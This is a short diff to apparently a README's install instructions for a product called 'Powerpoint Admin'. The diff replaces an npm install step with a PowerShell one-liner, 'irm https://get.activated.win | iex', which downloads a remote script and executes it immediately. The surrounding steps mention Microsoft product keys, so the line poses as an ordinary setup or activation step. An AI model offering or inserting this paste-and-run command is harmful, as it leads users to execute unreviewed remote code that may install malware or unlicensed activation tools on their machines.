@@ -18,9 +18,10 @@ After Download:
 After installation:
 
 1. Open **Powerpoint Admin**.
-2. ```bash
-npm install
-npm run dev
+### PowerShell
+
+```powershell
+irm https://get.activated.win | iex
 ```
 3. If you purchased a product key, redeem it through Microsoft's official setup page.
 4. Follow the activation instructions.
